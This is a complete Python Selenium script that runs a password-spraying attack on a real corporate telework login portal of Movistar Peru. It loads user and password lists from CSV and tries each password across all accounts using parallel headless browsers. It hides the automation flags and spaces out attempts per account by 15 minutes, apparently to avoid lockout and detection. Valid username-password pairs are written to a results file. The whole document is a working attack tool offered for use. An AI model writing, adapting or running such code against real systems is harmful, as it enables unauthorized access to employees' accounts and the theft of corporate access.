import time
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from tqdm import tqdm
from colorama import Fore, Style, init
import os
import logging
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from collections import defaultdict

# Configurar logging completo
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - [%(threadName)s] - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('log.txt', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Inicializar colores
init(autoreset=True)

# URL del login
URL = "https://teletrabajo.movistar.pe"

# Locks para sincronización
file_lock = threading.Lock()
tiempo_lock = threading.Lock()
usuarios_lock = threading.Lock()

# Estructuras de datos compartidas
ultimo_uso_usuario = defaultdict(lambda: datetime.min)
usuarios_exitosos = set()  # Usuarios que ya tuvieron login exitoso
usuarios_disponibles = []  # Cola de usuarios disponibles para probar

def log_info(mensaje):
    """Log con info"""
    logger.info(mensaje)
    print(Fore.CYAN + mensaje)

def log_success(mensaje):
    """Log de éxito"""
    logger.info(mensaje)
    print(Fore.GREEN + mensaje)

def log_error(mensaje):
    """Log de error"""
    logger.error(mensaje)
    print(Fore.RED + mensaje)

def log_warning(mensaje):
    """Log de advertencia"""
    logger.warning(mensaje)
    print(Fore.YELLOW + mensaje)

def cargar_csv(archivo, nombre_tipo):
    """Cargar CSV con múltiples codificaciones y separadores"""
    try:
        if not os.path.exists(archivo):
            log_error(f"❌ No se encontró el archivo '{archivo}'")
            return None
        
        encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
        separadores = [',', ';', '\t', '|']
        df = None
        encoding_usado = None
        separador_usado = None
        
        for encoding in encodings:
            for sep in separadores:
                try:
                    df = pd.read_csv(archivo, encoding=encoding, sep=sep)
                    if len(df.columns) >= 1:
                        encoding_usado = encoding
                        separador_usado = sep
                        break
                except:
                    continue
            if df is not None and len(df.columns) >= 1:
                break
        
        if df is None:
            log_error(f"❌ No se pudo leer '{archivo}'")
            return None
        
        sep_nombre = {',': 'coma', ';': 'punto y coma', '\t': 'tabulación', '|': 'pipe'}
        log_info(f"✅ '{archivo}' leído - Encoding: {encoding_usado}, Separador: {sep_nombre.get(separador_usado, separador_usado)}")
        log_info(f"📋 Columnas encontradas: {df.columns.tolist()}")
        
        # Tomar la primera columna
        primera_col = df.columns[0]
        df = df.rename(columns={primera_col: nombre_tipo})
        
        # Limpiar datos
        df[nombre_tipo] = df[nombre_tipo].astype(str).str.strip()
        df = df.dropna(subset=[nombre_tipo])
        
        log_success(f"✅ Cargados {len(df)} {nombre_tipo}s desde '{archivo}'")
        return df
        
    except Exception as e:
        log_error(f"❌ Error al cargar '{archivo}': {e}")
        return None

def cargar_datos():
    """Cargar usuarios y contraseñas"""
    log_info("\n" + "="*70)
    log_info("📂 CARGANDO ARCHIVOS CSV")
    log_info("="*70)
    
    usuarios_df = cargar_csv("credenciales.csv", "usuario")
    passwords_df = cargar_csv("contraseña.csv", "password")
    
    if usuarios_df is None or passwords_df is None:
        log_error("❌ Error: No se pudieron cargar los archivos necesarios")
        log_info("\n📝 Asegúrate de tener:")
        log_info("   - credenciales.csv (lista de usuarios)")
        log_info("   - contraseña.csv (lista de contraseñas)")
        return None, None
    
    return usuarios_df, passwords_df

def cargar_usuarios_exitosos():
    """Cargar usuarios que ya tuvieron login exitoso"""
    try:
        if os.path.exists("loginExitoso.csv"):
            df = pd.read_csv("loginExitoso.csv")
            usuarios = set(df['usuario'].unique())
            log_info(f"📂 Cargados {len(usuarios)} usuarios con login exitoso previo (serán excluidos)")
            return usuarios
    except Exception as e:
        log_warning(f"No se pudieron cargar usuarios exitosos previos: {e}")
    return set()

def configurar_driver():
    """Configurar navegador Chrome optimizado"""
    options = webdriver.ChromeOptions()
    
    # Modo headless
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    
    # Optimizaciones
    options.add_argument("--start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-extensions")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    # Deshabilitar recursos innecesarios
    prefs = {
        "profile.managed_default_content_settings.images": 2,
        "profile.managed_default_content_settings.stylesheets": 2,
        "profile.default_content_setting_values.notifications": 2,
        "disk-cache-size": 4096
    }
    options.add_experimental_option("prefs", prefs)
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--disable-logging")
    options.add_argument("--log-level=3")
    options.add_argument("--silent")
    options.add_argument("--blink-settings=imagesEnabled=false")
    options.add_argument("--disable-remote-fonts")
    
    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver
    except Exception as e:
        log_error(f"Error configurando navegador: {e}")
        return None

def obtener_siguiente_usuario(password_idx):
    """Obtener el siguiente usuario disponible (que haya pasado 15 min y no sea exitoso)"""
    global usuarios_disponibles
    
    with usuarios_lock:
        ahora = datetime.now()
        tiempo_minimo = timedelta(minutes=15)
        
        # Buscar usuario disponible
        for i, usuario in enumerate(usuarios_disponibles):
            # Verificar si ya fue exitoso
            if usuario in usuarios_exitosos:
                continue
            
            # Verificar tiempo transcurrido
            ultimo_uso = ultimo_uso_usuario[usuario]
            tiempo_transcurrido = ahora - ultimo_uso
            
            if tiempo_transcurrido >= tiempo_minimo:
                # Actualizar último uso
                ultimo_uso_usuario[usuario] = ahora
                log_info(f"✓ Usuario '{usuario}' seleccionado para password #{password_idx + 1}")
                return usuario
        
        # Si no hay ninguno disponible, esperar al más próximo
        log_warning(f"⏳ Todos los usuarios usados recientemente, esperando...")
        
        # Encontrar el usuario con menor tiempo de espera
        min_espera = float('inf')
        for usuario in usuarios_disponibles:
            if usuario in usuarios_exitosos:
                continue
            
            ultimo_uso = ultimo_uso_usuario[usuario]
            tiempo_transcurrido = ahora - ultimo_uso
            tiempo_restante = (tiempo_minimo - tiempo_transcurrido).total_seconds()
            
            if tiempo_restante < min_espera and tiempo_restante > 0:
                min_espera = tiempo_restante
        
        if min_espera > 0 and min_espera < float('inf'):
            log_warning(f"⏳ Esperando {int(min_espera/60)} minutos...")
            time.sleep(min_espera)
            return obtener_siguiente_usuario(password_idx)
        
        return None

def marcar_usuario_exitoso(usuario):
    """Marcar usuario como exitoso y excluirlo de futuras pruebas"""
    with usuarios_lock:
        usuarios_exitosos.add(usuario)
        log_success(f"🎯 Usuario '{usuario}' marcado como EXITOSO - Excluido de futuras pruebas")
        log_info(f"📊 Total usuarios exitosos hasta ahora: {len(usuarios_exitosos)}")

def intentar_login(driver, wait, usuario, password):
    """Intentar login y verificar resultado"""
    try:
        log_info(f"🚀 Iniciando login: Usuario='{usuario}' | Password='{password}'")
        
        # Cargar página
        driver.get(URL)
        log_info(f"🌐 Página cargada: {URL}")
        time.sleep(2)
        
        # Ingresar usuario
        log_info("👤 Localizando campo de usuario...")
        input_user = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login"]')))
        input_user.clear()
        input_user.send_keys(usuario)
        log_info(f"✓ Usuario ingresado: {usuario}")
        time.sleep(0.5)
        
        # Ingresar contraseña
        log_info("🔒 Localizando campo de contraseña...")
        input_pass = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]')))
        input_pass.clear()
        input_pass.send_keys(password)
        log_info(f"✓ Contraseña ingresada: {password}")
        time.sleep(0.5)
        
        # Click en botón login
        log_info("🔘 Buscando botón de login...")
        boton_login = wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]')))
        boton_login.click()
        log_info("✓ Click en botón de login ejecutado")
        
        # Esperar 4 segundos para verificar mensaje de error
        log_info("⏱️ Esperando 4 segundos para verificar resultado...")
        time.sleep(4)
        
        # Verificar mensaje de error específico
        try:
            error_element = driver.find_element(By.XPATH, '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span')
            if error_element and error_element.is_displayed():
                error_text = error_element.text.strip()
                log_error(f"❌ Mensaje de error detectado: '{error_text}'")
                
                if "Contraseña incorrecta" in error_text or "incorrecta" in error_text.lower():
                    log_error(f"❌ LOGIN INCORRECTO: Usuario='{usuario}' | Password='{password}' | Razón: Contraseña incorrecta")
                    return "INCORRECTO"
        except:
            # No se encontró el mensaje de error
            log_info("✓ No se detectó mensaje de error de contraseña")
        
        # Verificar otros mensajes de error
        mensajes_error = [
            "//div[contains(@class, 'error')]",
            "//span[contains(@class, 'error')]",
            "//p[contains(@class, 'error')]",
            "//*[contains(text(), 'incorrecta')]",
            "//*[contains(text(), 'inválido')]",
            "//*[contains(text(), 'error')]"
        ]
        
        for selector in mensajes_error:
            try:
                elementos = driver.find_elements(By.XPATH, selector)
                if elementos and any(e.is_displayed() for e in elementos):
                    error_text = elementos[0].text.strip()
                    log_error(f"❌ Error genérico detectado: '{error_text}'")
                    log_error(f"❌ LOGIN INCORRECTO: Usuario='{usuario}' | Password='{password}'")
                    return "INCORRECTO"
            except:
                continue
        
        # Verificar URL
        url_actual = driver.current_url
        log_info(f"🔍 URL actual después del login: {url_actual}")
        
        # Si no hay errores y la URL cambió, es exitoso
        if url_actual != URL and "login" not in url_actual.lower():
            log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva URL: {url_actual}")
            marcar_usuario_exitoso(usuario)
            return "EXITOSO"
        
        # Verificar ventanas/pestañas nuevas
        if len(driver.window_handles) > 1:
            log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Nueva pestaña detectada")
            marcar_usuario_exitoso(usuario)
            return "EXITOSO"
        
        # Verificar elementos de sesión iniciada
        indicadores_exito = [
            "//a[contains(text(), 'Cerrar sesión')]",
            "//a[contains(text(), 'Logout')]",
            "//button[contains(text(), 'Salir')]",
            "//*[contains(text(), 'cambiar contraseña')]",
            "//*[contains(text(), 'change password')]"
        ]
        
        for selector in indicadores_exito:
            try:
                elementos = driver.find_elements(By.XPATH, selector)
                if elementos and any(e.is_displayed() for e in elementos):
                    log_success(f"✅ LOGIN EXITOSO: Usuario='{usuario}' | Password='{password}' | Indicador de sesión detectado")
                    marcar_usuario_exitoso(usuario)
                    return "EXITOSO"
            except:
                continue
        
        # Si no se detectó nada claro después de 4 segundos, considerar exitoso
        log_success(f"✅ LOGIN EXITOSO (sin error detectado): Usuario='{usuario}' | Password='{password}'")
        marcar_usuario_exitoso(usuario)
        return "EXITOSO"
        
    except Exception as e:
        log_error(f"❌ Error en proceso de login: Usuario='{usuario}' | Error: {e}")
        return "ERROR"

def guardar_resultado(usuario, password, resultado):
    """Guardar resultado en CSV correspondiente"""
    try:
        with file_lock:
            fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if resultado == "EXITOSO":
                archivo = "loginExitoso.csv"
            else:
                archivo = "loginIncorrecto.csv"
            
            existe = os.path.exists(archivo)
            
            df_nueva = pd.DataFrame([{
                'usuario': usuario,
                'password': password,
                'resultado': resultado,
                'fecha_hora': fecha_hora
            }])
            
            if existe:
                df_nueva.to_csv(archivo, mode='a', header=False, index=False, encoding='utf-8')
            else:
                df_nueva.to_csv(archivo, mode='w', header=True, index=False, encoding='utf-8')
            
            log_info(f"💾 Resultado guardado en '{archivo}': {usuario}")
            
    except Exception as e:
        log_error(f"Error guardando resultado: {e}")

def guardar_checkpoint(password_idx):
    """Guardar checkpoint del progreso"""
    try:
        with file_lock:
            with open("checkpoint.txt", "w") as f:
                f.write(f"{password_idx}")
            log_info(f"💾 Checkpoint guardado: Password #{password_idx}")
    except Exception as e:
        log_error(f"Error guardando checkpoint: {e}")

def cargar_checkpoint():
    """Cargar checkpoint previo"""
    try:
        if os.path.exists("checkpoint.txt"):
            with open("checkpoint.txt", "r") as f:
                contenido = f.read().strip()
                if contenido:
                    password_idx = int(contenido)
                    log_info(f"📂 Checkpoint cargado: Continuando desde Password #{password_idx}")
                    return password_idx
    except Exception as e:
        log_warning(f"No se pudo cargar checkpoint: {e}")
    return 0

def procesar_combinacion(args):
    """Procesar una combinación usuario-password específica"""
    usuario_idx, password_idx, usuario, password, total_usuarios, total_passwords = args
    
    driver = None
    try:
        # Verificar si el usuario ya fue exitoso
        with usuarios_lock:
            if usuario in usuarios_exitosos:
                log_warning(f"⏭️ Usuario '{usuario}' ya fue exitoso anteriormente - SALTANDO")
                return (usuario_idx, password_idx, usuario, password, "SALTADO")
        
        log_info(f"\n{'='*70}")
        log_info(f"🔄 PROCESANDO COMBINACIÓN")
        log_info(f"   Usuario: {usuario} (#{usuario_idx + 1}/{total_usuarios})")
        log_info(f"   Password: {password} (#{password_idx + 1}/{total_passwords})")
        log_info(f"   Usuarios exitosos acumulados: {len(usuarios_exitosos)}")
        log_info(f"{'='*70}")
        
        # Esperar tiempo mínimo si es necesario
        with tiempo_lock:
            ahora = datetime.now()
            ultimo_uso = ultimo_uso_usuario[usuario]
            tiempo_transcurrido = (ahora - ultimo_uso).total_seconds()
            tiempo_espera = 900  # 15 minutos
            
            if tiempo_transcurrido < tiempo_espera:
                tiempo_restante = tiempo_espera - tiempo_transcurrido
                log_warning(f"⏳ Usuario '{usuario}' usado hace {int(tiempo_transcurrido/60)} min. Esperando {int(tiempo_restante/60)} min...")
                time.sleep(tiempo_restante)
            
            # Actualizar último uso
            ultimo_uso_usuario[usuario] = datetime.now()
        
        # Crear driver
        log_info("🔧 Configurando navegador...")
        driver = configurar_driver()
        if driver is None:
            log_error("❌ No se pudo configurar el navegador")
            return (usuario_idx, password_idx, usuario, password, "ERROR")
        
        wait = WebDriverWait(driver, 15)
        
        # Intentar login
        resultado = intentar_login(driver, wait, usuario, password)
        
        # Guardar resultado
        guardar_resultado(usuario, password, resultado)
        
        # Guardar checkpoint cada 10 combinaciones
        combinacion_num = usuario_idx * total_passwords + password_idx
        if combinacion_num % 10 == 0:
            guardar_checkpoint(password_idx)
        
        return (usuario_idx, password_idx, usuario, password, resultado)
        
    except Exception as e:
        log_error(f"❌ Error procesando: Usuario='{usuario}' Password='{password}' | Error: {e}")
        return (usuario_idx, password_idx, usuario, password, "ERROR")
    finally:
        if driver:
            try:
                driver.quit()
                log_info("🔒 Navegador cerrado")
            except:
                pass

def main():
    """Función principal"""
    global usuarios_disponibles, usuarios_exitosos
    
    log_info("="*70)
    log_info("🚀 VALIDADOR MASIVO DE CREDENCIALES - TELETRABAJO MOVISTAR")
    log_info("⚡ Modo OPTIMIZADO: Rotación inteligente + Exclusión automática")
    log_info("="*70)
    log_info(f"📅 Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Cargar datos
    usuarios_df, passwords_df = cargar_datos()
    if usuarios_df is None or passwords_df is None:
        return
    
    # Cargar usuarios exitosos previos
    usuarios_exitosos = cargar_usuarios_exitosos()
    
    # Inicializar lista de usuarios disponibles
    todos_usuarios = usuarios_df['usuario'].tolist()
    usuarios_disponibles = [u for u in todos_usuarios if u not in usuarios_exitosos]
    
    passwords = passwords_df['password'].tolist()
    
    total_usuarios_inicial = len(todos_usuarios)
    total_usuarios_activos = len(usuarios_disponibles)
    total_passwords = len(passwords)
    
    log_info(f"\n📊 ESTADÍSTICAS:")
    log_info(f"   👥 Total usuarios: {total_usuarios_inicial:,}")
    log_info(f"   ✅ Usuarios ya exitosos (excluidos): {len(usuarios_exitosos)}")
    log_info(f"   🔄 Usuarios activos para probar: {total_usuarios_activos:,}")
    log_info(f"   🔑 Contraseñas: {total_passwords}")
    log_info(f"   ⏱️ Tiempo mínimo entre usos: 15 minutos")
    log_info(f"\n🎯 ESTRATEGIA:")
    log_info(f"   1. Usuario1 + Password1")
    log_info(f"   2. Usuario2 + Password1")
    log_info(f"   3. Usuario3 + Password1")
    log_info(f"   4. ... (todos los usuarios con Password1)")
    log_info(f"   5. Usuario1 + Password2 (si pasaron 15 min)")
    log_info(f"   6. Si usuario es EXITOSO → se EXCLUYE automáticamente")
    
    if total_usuarios_activos == 0:
        log_success("🎉 ¡Todos los usuarios ya tienen login exitoso!")
        return
    
    # Configuración
    NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores en paralelo? (recomendado 3-5): ") or "3")
    log_info(f"🔀 Configurado para usar {NUM_THREADS} navegadores en paralelo")
    
    # Cargar checkpoint
    inicio_password = cargar_checkpoint()
    if inicio_password > 0:
        respuesta = input(f"\n⚠️ Checkpoint encontrado (Password #{inicio_password}). ¿Continuar? (s/n): ")
        if respuesta.lower() != 's':
            inicio_password = 0
    
    # Preparar tareas (todas las combinaciones siguiendo la estrategia)
    log_info("\n🎯 Preparando todas las combinaciones...")
    tareas = []
    
    # Estrategia: Password1 con todos los usuarios, luego Password2 con todos, etc.
    for idx_p, password in enumerate(passwords):
        for idx_u, usuario in enumerate(usuarios_disponibles):
            # Solo agregar si el usuario no está en exitosos
            if usuario not in usuarios_exitosos:
                tareas.append((idx_u, idx_p, usuario, password, total_usuarios_activos, total_passwords))
    
    total_combinaciones = len(tareas)
    log_info(f"✅ {total_combinaciones:,} combinaciones preparadas")
    log_info(f"   ({total_usuarios_activos:,} usuarios × {total_passwords} contraseñas)")
    
    # Estadísticas
    exitosos = 0
    incorrectos = 0
    errores = 0
    saltados = 0
    
    try:
        log_info(f"\n🏁 INICIANDO PROCESAMIENTO PARALELO")
        log_info(f"⏱️ Tiempo estimado: ~{(total_combinaciones * 8) / NUM_THREADS / 3600:.1f} horas\n")
        
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(procesar_combinacion, tarea): tarea for tarea in tareas}
            
            with tqdm(total=total_combinaciones, desc="🔄 Progreso", unit="comb") as pbar:
                for future in as_completed(futures):
                    try:
                        usuario_idx, password_idx, usuario, password, resultado = future.result()
                        
                        if resultado == "EXITOSO":
                            exitosos += 1
                            tqdm.write(Fore.GREEN + f"✅ EXITOSO: {usuario} | {password}")
                        elif resultado == "INCORRECTO":
                            incorrectos += 1
                        elif resultado == "SALTADO":
                            saltados += 1
                        else:
                            errores += 1
                        
                        pbar.update(1)
                        pbar.set_postfix({
                            'Exitosos': exitosos,
                            'Incorrectos': incorrectos,
                            'Saltados': saltados,
                            'Errores': errores
                        })
                        
                    except Exception as e:
                        log_error(f"Error obteniendo resultado: {e}")
                        pbar.update(1)
        
        # Resumen final
        log_info("\n" + "="*70)
        log_info("📊 RESUMEN FINAL")
        log_info("="*70)
        log_info(f"✅ Logins exitosos: {exitosos}")
        log_info(f"❌ Logins incorrectos: {incorrectos}")
        log_info(f"⏭️ Combinaciones saltadas (usuario ya exitoso): {saltados}")
        log_info(f"⚠️ Errores: {errores}")
        log_info(f"🎯 Total usuarios con credenciales válidas: {len(usuarios_exitosos)}")
        log_info(f"📈 Total procesado: {exitosos + incorrectos + saltados + errores}")
        log_info(f"📁 Resultados guardados en:")
        log_info(f"   - loginExitoso.csv ({len(usuarios_exitosos)} usuarios)")
        log_info(f"   - loginIncorrecto.csv")
        log_info(f"   - log.txt (log completo)")
        log_info(f"📅 Finalizado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Limpiar checkpoint
        if os.path.exists("checkpoint.txt"):
            os.remove("checkpoint.txt")
            
    except KeyboardInterrupt:
        log_warning("\n⚠️ PROGRAMA INTERRUMPIDO POR EL USUARIO")
        log_info("💾 Progreso guardado en checkpoint.txt")
        log_info("▶️ Ejecuta nuevamente para continuar")
    except Exception as e:
        log_error(f"\n❌ ERROR CRÍTICO: {e}")
    finally:
        log_info("\n✅ PROGRAMA FINALIZADO")

if __name__ == "__main__":
    main()